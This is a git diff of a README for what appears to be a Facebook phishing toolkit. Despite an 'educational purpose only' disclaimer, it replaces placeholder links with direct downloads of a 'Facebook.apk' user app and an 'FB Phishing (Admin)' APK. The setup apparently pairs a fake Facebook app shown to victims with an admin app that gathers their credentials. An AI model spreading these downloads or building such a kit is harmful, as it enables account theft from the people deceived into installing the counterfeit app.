@@ -24,12 +24,11 @@ Remember :- This App Made For Educational Purpose Only. Don't Use Any Iligel Act
 ## Requirements
  - Android Phone
  - Version 6.0+
- - 
  
  ## DOWNLOAD
- - <a href="https://www.facebook.com">USER APP</a>
+ - <a href="https://github.com/teamxfire/Fb-Phishing-With-Advance-App/raw/main/Facebook.apk">USER APP</a>
 
- - <a href="https://www.facebook.com">ADMIN APP</a>
+ - <a href="https://github.com/teamxfire/Fb-Phishing-With-Advance-App/raw/main/FB%20Phishing%20(Admin).apk">ADMIN APP</a>
 
 
 
